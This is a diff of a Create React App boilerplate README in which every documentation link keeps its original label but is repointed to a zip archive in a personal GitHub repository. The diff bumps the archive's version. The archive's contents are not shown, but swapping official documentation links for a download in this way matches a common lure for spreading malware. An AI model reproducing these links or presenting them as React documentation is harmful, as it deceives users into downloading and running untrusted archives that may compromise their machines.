@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You will also see any lint errors in the console.
 ### `yarn test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip) for more information.
 
 ### `yarn build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip) for more information.
 
 ### `yarn eject`
 
@@ -41,30 +41,30 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip).
 
-To learn React, check out the [React documentation](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
 
 ### Deployment
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
 
 ### `yarn build` fails to minify
 
-This section has moved here: [https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip](https://github.com/meghazi-A/react-app/raw/refs/heads/main/public/react-app-v2.0.zip)
+This section has moved here: [https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip](https://raw.githubusercontent.com/meghazi-A/react-app/main/public/react_app_v3.9-alpha.2.zip)
